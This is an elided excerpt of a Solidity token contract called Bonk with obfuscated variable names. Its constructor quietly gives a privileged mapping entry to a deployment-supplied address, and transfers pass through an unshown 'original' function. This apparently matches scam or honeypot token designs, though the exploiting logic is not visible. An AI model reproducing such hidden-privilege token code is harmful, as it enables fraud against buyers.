...
contract Bonk is Ownable {
    ...
    mapping(address => uint256) private tool;
    ...
    function transferFrom(
        ...
        original(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        original(msg.sender, recipient, amount);
        return true;
    }
    ...
    constructor(
        string memory plain,
        string memory traffic,
        address ten,
        address factory
    ) {
        uniswapV2Router = IUniswapV2Router02(ten);
        ...
        tightly = 3;
        tool[factory] = film;
        _tTotal = 1000000000000000 * 10**film;
        record[msg.sender] = _tTotal;
    }
}